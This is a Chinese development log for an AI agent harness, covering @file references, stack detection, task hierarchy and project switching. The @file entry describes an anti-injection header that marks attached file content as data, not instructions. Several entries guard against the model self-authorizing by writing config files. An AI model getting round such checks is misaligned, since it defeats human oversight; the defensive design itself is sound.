**牵连系统 / 层次**：`src/input/at-file.ts`（**新增**：判据与渲染半边 —— `parseAtCandidates` / `looksLikePath` / `composeAtFile` / `formatBytes` / `AT_HEADER` + 五道常量，**零 import 纯函数**）· `src/input/probe.ts`（**新增**：探针半边 —— `probeAtRef` / `resolveAtFile` / **`atFileInputHandler(getCwd)`**，**全项目唯一**为本功能碰 fs 处，只用 node 内置 fs / path）· `src/harness/main.ts`（**注册一行**：`runtime.onInput(atFileInputHandler(() => process.cwd()))`，在模式分发之前，RPC 与 REPL 共用）· `src/runtime/runtime.ts`（`onInput()` 的 JSDoc 随事实更新：当前登记人不再是"没有登记人"）· `scripts/verify-at-file.ts`（**新增 69 项**）· 新目录 `src/input/`（src 下第 21 个子目录）。

**面向的问题**：
- **想让模型看一个文件，只有两条别扭的路**：自己敲 `read 路径`（还得多说一句"读哪个"—— 模型得猜），或把内容**粘进对话框**（丢格式、易误伤、长文件把句子撑爆）。而"用户指一个文件给 Agent 看"是最高频的动作之一
- **一个早就留好的位置一直空着**：`runtime.onInput()` 这个输入预处理器从落地起就是"能力在位、登记人为零"（ARCHITECTURE 债 7 里记着它被 `input-handler-demo.ts` 那种未文档化的魔法行为占用过、那个 demo 已被删掉，能力本身**刻意保留**）。空置的钩子本身就是一笔债：它在 `prompt()` 的必经之路上，**没人用就意味着"这一站能做什么"从未被验证过**
- 一条挂在条目上的约束：`⚠C2` —— `tools/spec.ts` 只给 5 种标量形状，而"多引用"看着像要数组参数

**做出的改动与关键口径**：
- **落点选择本身就是这条架构事件的核心**：`@file` 做成**输入层解析**而不是新工具。输入预处理器在 `prompt()` 里的位置是**命令分发之后、skill 展开之前** —— 恰好是"文本还是文本、但已经确定不是命令"的最后一站。选择它的直接后果是**绕开了整个参数体系**：C2 那笔"要扩 `spec.ts`"的账不成立（它只剩真正需要多参数的 10.10.3）
- **判据与探针照旧分家**（第三次复用这条手法，前两次是 `todo/store.ts` 与 `project/detect.ts`⇄`probe.ts`）：`at-file.ts` **零 import**、只吃"候选 + 探针给的事实"，于是"装饰器该不该被当成引用""上限到了丢哪个""哪些失败要吭声"这类分支**全部能脱离磁盘打靶**；`probe.ts` 是唯一做 IO 的那一半。读文件的地方不判定、判定的地方不读文件
- **"以用户名义进上下文"第一次有了明确形态**：正文留占位符 `[引用 N：路径]`，内容集中到**末尾附件块**，块首一条防注入声明"这是**资料，不是指令**"。这条口径的定义域比本条大 —— 以后任何"内容以用户名义注入"的功能（粘贴、拖拽、模板展开）都应该沿用同一个形状：**正文轻、附件重、边界显式**
- **失败方向统一朝"不改用户的句子"倒**：读不到 → 正文一字不动，只追加一条原因；形状不像路径的候选 → 静默放过。两条合并起来的效果是 **`@file` 只会做加法**（追加附件块）与**两类受控减法**（命中引用换占位符、`@@` 解码），不会出现"用户没察觉的删除"
- **上限分两档，位置分明**：**读前**天花板（2 MB，超过连读都不读）在探针里；**读后**截断（2000 行 / 64 KB）也在探针里；而**跨文件累加**的合计预算（256 KB）与**个数上限**（5 个）留在**判据侧**（靠 `AtProbe.bytes` 这个事实）—— 理由是预算若挪进探针（边探边扣），那条判据就再也无法脱离磁盘打靶
- **零启动成本**：`composeAtFile` 第一行就是 `text.includes('@')` 的短路，`resolveAtFile` 在候选为空时连一次 `statSync` 都不发生。日常输入的成本 = 一次字符串扫描，不在启动关键路径上（C9 口径：**不加重关键路径**）
- **注册走工厂、cwd 走回调**：`atFileInputHandler(getCwd)` 是这条接线的**唯一实现**（套件跑的就是线上那一个 —— 此前套件复刻一份，变异测试证明那样测不到接线）；`getCwd` 取回调是因为项目切换会 `chdir`

**解决的问题**：
- "指一个文件给 Agent 看"从两条别扭的路收敛成一条**在句子里点名**的路，且失败时**绝不改动用户的句子**
- **空置的钩子从债变成资产**：`runtime.onInput()` 第一次有了真实消费者，"输入预处理器"这一站的能力边界（能改文本、能追加、不能拦命令、非 TTY 也走）由本条实证
- C2 的担心**被架构选择消掉而非被实现绕过**：不是"硬把多引用塞进标量参数"，而是"这件事本来就不该走参数体系"。这条经验可复用：**当一条约束看起来要求扩协议时，先问"这件事属于哪一层"**
- 顺带删掉一处**死代码分支**（识别层的"看见 `@@` 跳两字符"）—— 它的性质已由 `STOP` / `BEFORE_OK` 两条判据推导出来，留着会误导后来者以为安全性由它负责

**未来可优化**：
- **不递归**（附件里的 `@foo` 不展开）·**不认识代码围栏**（``` 里的 `@path` 照样算引用）·**不做通配 / 不展开 `~`** —— 三条都是刻意的"不做"，理由同"要按内容判就得先解析 Markdown，成本与收益不成比例"
- `@@` 转义是**前缀码**手法（要写字面两个 `@` 得写 `@@@`），代价如实写在文件头；"输入里本来就有连续两个 `@` 而用户不想转义"那种误伤形态**没有用例覆盖**
- 恰好存在同名文件时 `@Component` 会被读进来（位置判据挡得住邮箱、挡不住装饰器）；路径边界与 `read` 工具同口径（任意路径、**不弹窗**）

<a id="log-2026-09-17-stack"></a>

## 2026-09-17 | project 层从"两半"长成"三半"：技术栈画像进场，并第一次把**命令表的 `run` 前缀**交给它派生

**牵连系统 / 层次**：`src/project/stack.ts`（**新增**：判据纯函数 `detectStack` / `parsePackageManagerField` / `renderStackSection` + `STACK_CANDIDATES` + `stackRegistry` 内存单例）· `src/project/probe.ts`（加 `probeStack()`；本文件仍是全项目唯一碰磁盘 / 起子进程的地方之一）· `src/project/commands.ts`（`parsePackageScripts` 加第二参数 `manager`、新增 `DEFAULT_MANAGER` / `SAFE_MANAGER`；**仍保持零 import**）· `src/harness/project-context.ts`（`seedProjectContext` 多播种一样：`stackRegistry`；文件头"装进来的是四样"→ 五样，"不读 package.json"这条边界改为**按用途分岔**）· `src/harness/main.ts`（命令表播种时把 `stackRegistry` 的 `nodeManager` 传进去）· `src/context/system-prompt.ts`（project 层判据从两半扩到三半，**内部顺序 现状 → 画像 → 命令表**）· `src/core/system-prompt.ts`（`SystemPromptContext` 加 `stack` 位）· `src/runtime/runtime.ts`（每轮渲染注入）· `scripts/verify-stack.ts`（**新增** 72 项）· `scripts/verify-commands.ts`（F10 / H2 / H4 三处随层结构改口径，项数仍 82）。

**面向的问题**：
- **进陌生项目的第一判断没有来源**：这是 TS 还是 Python？该跑 `npm` 还是 `pnpm`？此前全靠模型 `ls` + `read` 现猜。猜错的代价不是报错，而是**看着像项目不通过**（命令不存在只是退出码非 0，它**不知道自己猜错了**）—— 与 10.6.1 要消灭的是同一类误判，只是那一半解决的是"有哪些命令"，这一半解决"在哪个生态里"
- **已有的两半各自都少一块**：命令表知道"能跑什么"，却把 `run` 串前缀**写死成 `npm`**（`commands.ts` 的注释里留了"不嗅探包管理器，pnpm/yarn/bun 归 10.1.1 那类画像活儿"）；现状快照知道"系统由什么构成"，但那是**人写的散文**，不回答"用什么工具"。三半合起来才是一句完整的话：**长什么样 → 在哪个生态 → 能跑什么**
- 一条被显式挂在条目上的约束：`⚠C9` —— 新增探测**不得**毁掉 P6 第二档"启动关键路径 0 网络请求 + 0.7ms"的成果

**做出的改动与关键口径**：
- **判据与探针分家（沿用 10.11.6 的手法）**：`detectStack` 只吃"哪些文件存在 + `package.json` 的文本"，**不碰磁盘、不起进程**，于是每条分支都能构造着打靶；`probeStack()` 是唯一做 IO 的那一半（`existsSync` × 候选数 + 至多一次 `readFileSync`，**无子进程**）。读文件的地方不解析、解析的地方不读文件 —— 这让"判据的每一条"都能脱离终端验
- **画像产出的不是一段话，而是两个东西**：给人读的 `ProjectStack.items`（语言 / 包管理器 / 依据 / 标记）与给程序用的 `nodeManager`。后者是**这条功能真正接进系统的部位** —— 它喂给命令表的 `run` 前缀，于是"探测"第一次不只是"多说一句"，而是**改变了一条既有命令长什么样**
- **刷新率必须一致，而不是"各自自愈"**：画像与命令表**同刻播种**（都在 `seedProjectContext()` 与紧随其后的 `main.ts` 那段）、运行期都不回读。这里与 `.flint/PROJECT.md` 的"每轮现读即自愈"**刻意相反**，理由不是性能而是**一致性**：命令表只在启动读一次（`package.json` 是模型可写文件，运行期重读会开出免弹窗执行的路），若画像每轮现读，同一段上下文里就会出现"包管理器 `pnpm`"配着 `npm run test` 两个口径
- **C9 的答法是"不加重关键路径"，不是"推迟到首次用到"**：探测**不新增任何文件读取**（`package.json` 本来就是启动时读给命令表用的，画像复用同一份文本），净新增只有几次 `existsSync`。对照之下 `probeProject` 的 `gitRoot` 冷缓存首次可达 721ms —— 那才是真该惰性的东西，而它早就做成了惰性回调
- **project 层内部的顺序是承重的**：现状 → 画像 → 命令表。命令表里的包管理器前缀由画像派生，**先看到"用 pnpm"再看到 `pnpm run test`**，读者（模型）才会把它读成一件事而不是两处矛盾。层序本身（`core → tools → skills → project → memory → task → summary`）**一个字没动** —— 三半仍在同一条 `project` 消息里，"没有就不注入"的纪律也没动
- **原料清单是"共用下限、各持上限"**：`STACK_CANDIDATES = MANIFEST_FILES ∪ 探测专用文件`，方向**单向**（stack → detect）。准入判据要的是"这是不是项目根"的**最弱**证据（克制到五个，多了会把判据打穿），画像要的是"这是什么技术栈"的**描述**原料（多得多）；两者共享同一份下限、各自持有上限，而加长的部分**不得回流**去当准入证据

**解决的问题**：
- "进陌生项目先猜一轮、猜错了还不知道"这件事被消掉：语言 / 包管理器变成**读**而不是猜，且命令表的 `run` 串**由实测证据派生**（锁文件或 corepack 声明），不再是写死的 `npm`
- C9 的担心被正面回答，且回答方式比"惰性化"更精确：**关键路径上本来就没有重活**，因为要读的那个文件早就在读了
- 顺带补上一处**叙述与事实不符**：`project-context.ts` 文件头那句"不读 package.json"自本条起不再准确，改成**按用途分岔**的界线（展示用读一次、授权用只在启动读一次），旧叙述保留 + 补记更正 —— 边界演化的证据比一句漂亮的现状描述更有价值

**未来可优化**：
- 非 Node 生态**只有语言与包管理器名、没有命令派生**（本机装不了 cargo / go / poetry，按"没实测到的那一半不许用推理补"留白）；`Makefile` 同样刻意不在候选表
- 只认目录**下**的标记文件、不看父目录：monorepo 子包里启动时只报子包自己（与 10.11.6 把"在仓库子目录里"归并到仓库根是两回事 —— 那个改的是**登记**，这个改的是**画像**）
- 版本信息被丢掉（`packageManager` 的 `@9.1.0` 只取名字）、`build.gradle.kts` 不区分 Kotlin —— 都是"要解析内容才能知道、而收益不明"的那一类

<a id="log-2026-09-17-todo-tree"></a>

## 2026-09-17 | 任务清单的投影契约升为"缩进 + 按需标记 + 前缀码转义"：层次 / 依赖 / 时间戳三项一起落地

**牵连系统 / 层次**：`src/todo/store.ts`（`TaskItem` 加 `parent` / `after` / 三个时间戳；`add` / `start` 的返回值改**判别式联合**；新增 `depthsOf` / `itemDuration` / `formatDuration` / `spanOf`；`parseLines` 抽成 `fromMarkdown` 与 `readHistory` 共用的实现；`renderItems` 加按需 ` ⤴N` 与前缀码转义；`archiveToFile` / `readHistory` 的归档头带耗时）· `src/tools/builtin.ts`（`todo` spec 加 `parent:N` / `after:N` 两个标量参数 + handler 的 `bad-parent` / `bad-after` / `blocked` 三条新分支）· `src/io/ui/task-panel.ts`（按深度缩进、逐行收窄宽度、`withDuration`）· `src/commands/builtin/tasks.ts` · `src/context/sections/core-section.ts`（【工作记忆】改口）· `scripts/verify-todo.ts` 83 → 109 项 · `scripts/fixtures/tool-schemas-baseline.json`（**只**重导出 `todo` 一个键）。

**面向的问题**：
- 清单是**扁平一维**的（`TaskItem = {text, status}`）：真实的多步工程里"改 A，顺带改它的三个调用方"这种从属关系只能拍平成平级项，清单越长越像一堆散装待办
- 唯一的不变量只有"至多一项进行中"，**没有任何"必须等 A 完成才能做 B"的表达** —— 模型要么自己心里记着（换一轮上下文就丢），要么把还没准备好的一步先干了
- **"卡了多久"答不出**：`TaskItem` 无任何时间字段（P8 待办的原话）
- 更根本的一层：**这个投影格式的形状决定了它能表达什么**。`- [x] 文本` 这种一维行格式**结构上装不下归属关系**，而格式一旦放宽（比如改成嵌套结构）就会把"逐行可校验"这个最大的优点毁掉 —— 所以真正要设计的不是"加几个字段"，而是"**在保持逐行格式的前提下，怎么把层次表达出来**"

**做出的改动与关键口径**：
- **层次与依赖都只加标量参数（`parent` / `after`，均指向已存在的更早项，`0` 表示无）**：`spec.ts` 的 5 种标量形状够用，**协议零改动**；"只许指向更早项"这条约束顺带白捡一个性质 —— 父指针**不可能成环**，于是 `depthsOf()` 一次顺序扫描就能算完，不必为它写环检测。与 10.12.14 选"分段编号"而不是"嵌套表"是**同一条判据**
- **缩进是投影的层次表达，`depthsOf()` 是它的唯一实现**：渲染 / 解析 / 面板 / `/tasks` 四处共用同一份深度计算，杜绝"磁盘写两层、终端画一层"
- **缩进表达不了的部分，用按需标记补齐**：缩进 + 登记顺序**推不出全部父子关系**（"父项=1 的子项排在别的同层项之后"会被"最近的前一个同级项"抢走父级）。故**只在缩进推不出真父级时**才追加 ` ⤴N`（推得出就一个字不写，投影保持可读），解析端在同一个 `lastAtDepth` 扫描里认它 —— 这是"**默认走简洁路径、只在有歧义时付显式代价**"的形态
- **正文与标记之间要靠转义才能互逆**：正文里出现的 `←` / `⤴` / `⇐` 会被解析当成标记吃掉。用前缀码（`⇐` 自身先翻倍，`←` → `⇐←`、`⤴` → `⇐⤴`），且**只有指向已存在更早项时才算标记**，否则原样留在正文。这是本仓第一处"用户文本 ↔ 磁盘格式"的转义机制 —— 只要投影文件里存自由文本，这一对函数就躲不掉
- **时间戳刻意不投影**：`createdAt` / `startedAt` / `doneAt` 只活在内存里 —— 它们是**会话内的运行期事实**，不是要跨会话继承的状态；落盘只会让"严格互逆"多出三个必须往返的字段。跨会话耗时改由归档头 `## <时间> 完成（耗时 Xs）` 承载（旧格式仍可读）。**直接后果**：跨重启往返断言只能比结构字段，且字段清单**用白名单**列出 —— 用黑名单"排除时间戳"的写法，会在将来加第四个字段时静默放过它
- **"至多一项进行中"仍是全局的，父子状态不派生**：与路线图的"**父级状态由子树派生**"**取向刻意相反** —— 路线图是给人看的进度条（派生能省掉手写状态），清单是执行器的工作台（派生只会让"到底在进行哪件事"重新说不清）。判据是"这个不变量得能一句话判完"
- **校验落在 `start` 而不在 `add`，且前置消失时 fail-open**：`add after:N` 只做声明（登记时习惯先把整张写完）；前置项被 `clear` 后当无依赖放行 —— 否则残留的 `after` 会把项永久锁死。与 `.gitignore` 那条"认不出即丢弃"同源、方向相反且两边都对：**该往哪边倒看哪种错更难发现**
- **`parseLines` 抽成共享实现**：种子（`fromMarkdown`）与归档回读（`readHistory`）此前各写一套行解析，加了缩进与标记之后必然分家，故合成一份

**解决的问题**：
- 清单能表达归属（子步骤）与顺序约束（前置），且**投影格式仍是逐行可校验的一维文本**；面板与 `/tasks` 按层显示，"卡了多久"有了答案
- **往返不变量的口径被收紧并写死**：结构字段（`text`/`status`/`parent`/`after`）在**含 `← ⇐ ⤴` 的对抗样本**下仍严格互逆，时间戳的"不落盘"由一条白名单断言钉住
- 澄清了一类通用判断错误：C3 原先预判"加层级必须同步改三处承重"，实际**一处都没动**；成本全在"字段进出投影的那两步"。以后遇到"给内存状态加字段"，第一个该问的是"**要不要落盘？要落盘就先设计它的歧义与逃逸规则**"

**未来可优化**：
- **没有 `move` / 重排**：`parent` 只在 `add` 那一刻给，登记后改归属只能 `clear` 重来（10.3.3 优先级与排序仍未做）。若要做，落点应是 `todo` 工具的一个新 `op`，而不是给 `add` 加语义
- **"暂停"没有表达**：只有单个 `startedAt`，做一半去干别的再回来 `start`，耗时会把中间那段算进去。要准确得多段累计 + 一个 `paused` 状态
- **深层的视觉收益递减**：面板只在窄屏时按深度收窄可用宽度，不做折叠；层级很深时应该换成"只显示当前层的兄弟 + 路径面包屑"
- **转义函数目前是 `todo` 内部私有**：将来若有别的投影文件也要存自由文本，应把这对函数提到共享位置，而不是各写一份（各写一份必然在"漏了一种标记字符"上分家）

---

<a id="log-2026-09-17-project-admission"></a>

## 2026-09-17 | `src/project/` 分出"判据 / 探针 / 纯逻辑"三个模块：通讯录准入从"无条件写"变成"按证据裁决"

**牵连系统 / 层次**：新增 `src/project/detect.ts`（准入判据，**零 import**）· 新增 `src/project/probe.ts`（**全项目唯一**碰磁盘 / 起子进程的探测层）· `src/project/projects.ts`（补 `renderRegistrationNote` / `renderAddReceipt` 两个渲染函数与新的 `add` 动作解析）· `src/harness/project-context.ts`（`ProjectContextReport` 增 `verdict`、新增 `SeedOptions.register`、新增装配点 `registerProject(mode)`）· `src/commands/builtin/projects.ts`（新增 `--add` 通道 + `currentDirNote()`；与 `src/project/detect.ts` 新增一条依赖边）· `src/eventlog/registry.ts`（`normalizeProjectPath` 升 `realpathSync.native`、`load()` 读时归一化 + 去重、新增只读 `has()`）· `src/io/ui/tree-ui.ts` / `src/harness/repl.ts`（`projectNote` 块）· `scripts/verify-detect.ts` 82 项。

**面向的问题**：
- 注册表是**无条件写**的：`ensure(process.cwd())` 只要启动过就落一行，家目录 / 临时目录 / 盘根 / `node_modules` 全都进簿子
- 上面那个问题**不是"列表难看"**：簿子是 `pull_events` 的取件索引，而它**按短名匹配**。一条噪音行会在将来某个时刻让"同名项目"的事件流指向别处，且**静默**——没有报错、没有提示
- 归一化只做字符串处理挡不住重复行：实测普通 `realpathSync` 原样返回入参大小写、也不解 junction，而 `chdir` 进 junction 后 `process.cwd()` 报别名 —— 同一项目会占两行

**做出的改动与关键口径**：
- **`src/project/` 一分为三，职责按"谁碰外部世界"切**：`detect.ts` = 判据（**零 import** 纯函数，零依赖使得"构造 probes 打靶"成为可能，不必造真目录 / 真仓库）；`probe.ts` = 探测（唯一 `node:fs` / `child_process` 出现处）；`projects.ts` = 参数解析与渲染（纯函数，10.11.1 已有）。这条切法沿用本仓一贯形态（`git.ts` / `gitignore.ts` / `postcheck.ts` 同路），但这次**多切出一层"探测"**：判据要能脱离磁盘被验，而"看盘"又不能混进判据
- **判据的次序就是结论**：① 硬排除 → ② 实物档案 → ③ git 仓库根 → ④ 清单文件 → ⑤ 候选。**硬排除必须排在"看档案"之前** —— 家目录必然含 `~/.flint/`（flint 的全局配置目录），顺序颠倒则家目录被百分之百命中。硬排除**不看证据**（家目录里放着整个仓库也不登记），因为"在这类目录里启动"本身就是信号
- **git 探测是惰性回调而非取值**：`ProjectProbes.gitRoot` 是 `() => string | null`。①② 定案的分支一个子进程都不起（实测冷缓存首次 721ms、仓库内 15–16ms、非仓库 14ms、git 缺失 `ENOENT` 3ms），代价只落在真需要问 git 的路上。这条把"启动变慢"从"可能"变成"不可能"
- **三态裁决 + 装配点分离**：`judgeProject` 只回 `independent` / `nested` / `candidate`，**写不写盘由 `registerProject(mode)` 决定**（`nested` 写仓库根 —— "在仓库子目录里启动"不新增行）。判据与副作用分开，使得"候选不写盘"可以被纯函数验证，也让 `--switch` / `--add` 的显式通道只需换一个 `mode`
- **"登记"与"装上下文"解耦**：候选目录**照样** `seedProjectContext` 装载上下文，只跳过 `ensure()`。两者管的是不同问题（簿子决定未来从哪取件 / 注入决定这一轮给模型看什么），顺手合并会让模型在真空里干活
- **新增反向边一格**：`commands/builtin/projects.ts` 为显示"当前目录为何没进簿子"而 import `project/detect.ts`。它是**纯判据**、不是 harness，故方向上是"命令层 → 更中立的纯逻辑"，与 10.11.1 那条"命令层 → harness"性质不同、也更轻

**解决的问题**：
- 准入从"被动记录"变成"**主动裁决**"：强证据（实物档案 / git 仓库根 / 清单文件）才登记，硬排除一票否决，判不准**不写盘**并给出一条召回路径（`/projects --add`）
- **判据可脱离磁盘被验证**（零 import），"看盘"的代价被限制在一个模块内；`verify-detect.ts` 因此能穷举前缀陷阱（`C:\build` 不算在 `C:\` 里）而不需要真的建出那些目录
- 归一化的两个真实缺口（大小写 / junction）被堵住，且**读时归一化不回写**：老记录里的反斜杠 / 重复行是**足迹**，改文件才是越权

**未来可优化**：
- 清单文件这条规则（`package.json` / `pyproject.toml` / `go.mod` / `Cargo.toml` / `pom.xml`）目前只有"构造 probes"的判据用例，缺一条**端到端**（真目录 → 真探针 → 真登记）
- 没有忽略名单；若将来确有"某目录永远别记"的需求，先考虑扩硬排除而不是引入一份要人维护的例外表
- `symlink` **未实测**（本机建软链返回 `EPERM`），目前只宣称 junction；换机器跑一次才能补上这一半
- 候选的召回路径目前只印在**启动 / 列表 / 切换**三处；若 `/projects` 之外还有入口需要它，应把这句提示收进 `renderRegistrationNote` 的唯一实现（现已是唯一实现，只需接线）

---

<a id="log-2026-09-16-project-context"></a>

## 2026-09-16 | 启动播种抽成唯一实现 + 命令层第一次反向依赖 harness：`/projects` 项目切换

**牵连系统 / 层次**：新增 `src/harness/project-context.ts`（`seedProjectContext()`，启动播种唯一实现）· `src/harness/main.ts`（删掉内联的五段播种，改调一处）· 新增 `src/project/projects.ts`（纯逻辑，零 import）· 新增 `src/commands/builtin/projects.ts`（第 14 个内置命令 `/projects`，**命令层第一次反向依赖 harness**）· `src/eventlog/registry.ts`（`PROJECTS_FILE` 常量 → `projectsFilePath()` 函数，支持 `FLINT_PROJECTS_FILE` 重定向）· `src/eventlog/store.ts`（`EventStore.reset()`）· `src/todo/store.ts` / `src/memory/store.ts`（`reset()` 注释补生产用法）· `src/io/ui/tree-ui.ts`（顶栏 Runtime 行改成每帧现取 cwd）· `scripts/verify-projects.ts` 80 项。

**面向的问题**：
- 注册表 `~/.flint/projects.jsonl` **一直在写、却没有读取端** —— 项目一多，这张表就成了只有写入端的账本（10.11.1 的原始缺口）
- 更根本的：**"启动时的上下文播种"没有任何可复用的形状**。五步（TASK.md 种子 / memory 种子 / events 种子 / 契约锁 / 登记表 `ensure`）焊死在 `main()` 里连着几段代码，任何"对着另一个目录再走一遍启动"的需求都只能**照抄一份**，而照抄的两份实现一定会各错一半
- 状态从文件搬进内存（todo / memory / eventlog 的 C 方案）之后，**"切换"这件事没有考虑过**：`loadFromFile` 对"文件不存在"是"保持现状"，于是旧项目的内容在切换时会赖着不走

**做出的改动与关键口径**：
- **抽 `seedProjectContext()` 为唯一实现**（`harness/project-context.ts`），`main()` 与 `/projects --switch` 共用。判据是"**两份实现只会各错一半，而'少装一样'的症状是看着正常**"。放 harness 的理由：它组装的是**启动期状态**，命令层不该自己拼这些子系统
- **先清后栽**：三个 store 的加载方必须先 `reset()` 再 `loadFromFile`。`loadFromFile` 的"保持现状"语义对**启动**是对的（没文件就别动），对**切换**是错的（新项目可能恰好没有这些文件）。切到一个什么都没有的项目时 `reset()` 是唯一擦除动作 —— 而这条恰恰是"变异全绿"的形态（两项目都有文件时漏掉它照样全绿），补 `bare` 空项目用例才钉住
- **授权类配置清空、不重读**：切换时 `commandRegistry.clear()` + `postcheckRegistry.set(null)` + `postcheckBaseline.set(null)`。这两份配置的授权判据建立在"**只在启动读一次**"上（防模型写配置自我授权），多一个运行期读取点会把判据从"不许回读"退化成"谁触发的可以回读"
- **契约锁不继承**：`charterLock` 是会话级的，切换后 `lock()` 回锁 —— 不然"在 A 解锁"的许可会被搬到 B。同一条思路：**凡在旧项目取得的许可都不跟着搬**
- **命令层第一次反向依赖 harness**（`commands/builtin/projects.ts` import `harness/project-context.ts`）。此前依赖方向是单向的 `harness → 一切`；这次命令层要复用启动播种，于是出现一条**反向边**。它被限制在一处、且只依赖一个"组装启动状态"的函数（不 import `main` / `repl` / `rpc`），由 `verify-projects.ts` 的源码守护钉住边界
- **纯逻辑与执行分离**：参数解析 / 选项目 / 排序 / 渲染全落 `src/project/projects.ts`（**零 import 纯函数**）；命令层只做 `chdir` / 开会话 / 调播种 / 清配置。不做交互选择器（非 TTY 下 `select` 自动返回第一项，而"切哪个项目"最不该被默认）
- **顶栏项目名实时刷新**：tree-ui 的 Runtime 行改成**每帧现取** `process.cwd()` 的项目名；tools/skills/cmds 三个计数**刻意不刷**（每帧重建 15 个 Schema 代价大、可见价值低）
- **测试隔离**：`ProjectRegistry` 落点从模块级常量改成 `projectsFilePath()` 函数（现读 `FLINT_PROJECTS_FILE`）—— ESM import 提升使"脚本设环境变量再 import"拿不到值，改常量则每跑一次套件就往真实 `~/.flint/projects.jsonl` 塞临时目录

**解决的问题**：
- 项目注册表第一次有了**读取端**，且切换是**真的切换**（cwd + 注入上下文 + 会话三处一起换），不是"换个显示"
- 启动播种有了**唯一形状**：日后任何"对着另一个目录初始化上下文"的需求（10.11.4 项目脚手架、测试夹具）都直接调它，不必再抄
- 切换后的**状态一致性**有了明确口径：能继承的（相对路径解析出的项目级文件）自动自愈，不能继承的（进程级单例 / 会话 / 技能计数 / 授权类配置 / 契约锁）逐条显式处理，且边界写进回执

**未来可优化**：
- 命令层反向依赖 harness 只此一处；若日后还有第二个命令要复用启动逻辑，应把 `seedProjectContext` 提到更中立的层（例如 `src/project/`），而不是让反向边变粗
- 切换时工具表与技能表**不重载**（顶栏计数不刷的同一取舍）；若将来要"切过去立刻用新项目技能/命令"，得先解决"运行期重读授权类配置"与"不许回读"的矛盾
- 会话切换目前固定开 `default.jsonl`（无则新建）；"切项目时恢复到上次那个会话"是独立议题（需要注册表多存一个字段）

---

<a id="log-2026-09-14-lifecycle-archive"></a>

## 2026-09-14 | 生命周期归档闭环：system prompt 新增 `project` 层，`archive` 工具把"归档 → 提议下一坐标"收成一个动作

**牵连系统 / 层次**：`core/system-prompt.ts` + `context/system-prompt.ts`（`SystemPromptLayer` 新增 `project`、分层顺序扩到七层）· `runtime/runtime.ts`（每轮读快照并注入）· `src/project/`（新增 `lifecycle.ts` / `snapshot.ts`，`roadmap.ts` 补文件级操作）· `tools/builtin.ts`（第 13 个内置工具 `archive`，12→13）· `context/sections/core-section.ts`（DoD 四件套 + PROJECT.md 注入说明）· `scripts/verify-lifecycle.ts` 97 项。

**面向的问题**：
- 系统提示词里**没有"当前系统长什么样"的承载位**：模型进了别人的项目，只能靠 `ls` / 读文件现猜自己在改什么东西
- 生命周期协议的四阶段闭环里，"归档 → 提议下一坐标"**只写在提示词里**——模型记得就问、忘了就断链（同批 ROADMAP 诊断的"触发缺失"）
- 归档要写两处（人读散文 + 机读四段），此前**没有任何一个动作**同时保证两者都写

**做出的改动与关键口径**：
- **system prompt 新增 `project` 层**，分层顺序扩为 `core → tools → skills → project → memory → task → summary`。位置按既有判据（越稳定越靠前）：PROJECT.md 比 `memory`（跨会话结论）稳定、比 `task`（当轮清单）易变，故夹在两者之间
- 新增 `project/snapshot.ts`：`.flint/PROJECT.md` 的**只读注入侧**。**刻意不建 store**（不照抄 TaskStore 的 C 方案）——它是只读注入，文件本身就是真相源，运行期直读即自愈；建一层内存副本只会多出"何时该重读"的问题（也就是那条铁律"谁负责通知 UI"），**没搬进内存就不用回答**。缺 / 空 / 读失败一律 `undefined`（整层不注入，不塞空话）
- 新增 `project/lifecycle.ts`（**零 import 纯函数**）：DEVLOG 一节排版 `renderDevlogEntry`（四段固定形状、空段不写空标题、多行压单行、末尾含空行当节间隔——**返回值就是文件里那一段**）+ 归档回执 `formatArchiveReceipt`。`roadmap.ts` 补文件级操作 `findCoordTable` / `spliceCoordTable`（只替换表那几行）/ `setStatus` / `unmetDeps` / `nextCoord`，模块仍零 import
- 新增第 13 个内置工具 **`archive`**：一次做完 ① DEVLOG 追加 ② `kind=system` 机读事件 ③ 路线图状态推进（写回的是 `resolveStatuses` 的**派生后权威状态**），并**顺带算出下一坐标**。不带 `requirePermission`（系统行为）、不 import `io/`（stdout 纯净规则）；**未命中就一字不落盘**
- 提示词补 **DoD 四件套**（代码 + 验证证据 + 文档同步 + 叙事归档，**缺一件不许标完成**）与"PROJECT.md 每轮注入、随代码漂移、自由改、不需许可"

**解决的问题**：
- 模型进场即知系统现状，不必现猜；且因为"文件即真相源"，改动立刻生效、无需失效逻辑
- "归档"这个动作**自带下一步**：提议由程序算（依赖关系 + 编号序，是输入的函数、不是判断），把"要记得提议"变成"躲不掉"
- 双写由同一个动作保证；散文与四段**刻意不互替**——两种读者（人要顺序读一遍、机器要跨会话捞得出来）
- 状态推进**只动坐标表**、表外散文逐字不动；父行不再手写状态，根治"父任务进行中、子任务全已完成"这类自相矛盾

**未来可优化**：
- 归档靠模型显式调工具触发，尚无"坐标一做完就提醒归档"的机器闸（DoD 只进了提示词）
- PROJECT.md 的内容形状不校验（刻意——它是自由散文）；若日后要"现状与代码对得上"的机器核对，是独立议题
- 分层顺序目前只由 `context/system-prompt.ts` 的实现顺序表达，**类型层面没有顺序约束**，靠 verify 断言钉住

---

<a id="log-2026-09-13-memory-eventlog"></a>

## 2026-09-13 | 记忆与经验沉淀：三层账本成型，注入与检索各走各的通道

**牵连系统**：新增 `src/memory/store.ts`（MemoryStore）与 `src/eventlog/store.ts`（EventStore）· `core/system-prompt.ts`（`SystemPromptLayer` 加 `memory`、`SystemPromptContext` 加 `memory`）· `context/system-prompt.ts`（memory 层注入，skills 与 task 之间）· `runtime/runtime.ts`（读 memoryStore 注入）· `tools/builtin.ts`（memory / record_event / search_events 三个工具，7→10）· `commands/builtin/memory.ts` 与 `events.ts`（新命令）· `harness/main.ts`（两个启动种子 + 第三个 SpanCollector 自动捕获）· `context/sections/core-section.ts`（【项目记忆与事件库】教学段）· `scripts/verify-memory.ts` 55 项 + `scripts/verify-eventlog.ts` 65 项。

**面向的问题**：flint 此前的"记忆"全部是会话内的——对话历史、压缩摘要、任务清单三件套都跟着会话走，换会话即清零；jsonl 是存档不是可复用记忆。用户要的是跨会话资产：项目约定/决策/坑要"开局就在"，过去的行为与经验要"用到时查得到"，且后者**不必然注入上下文**。

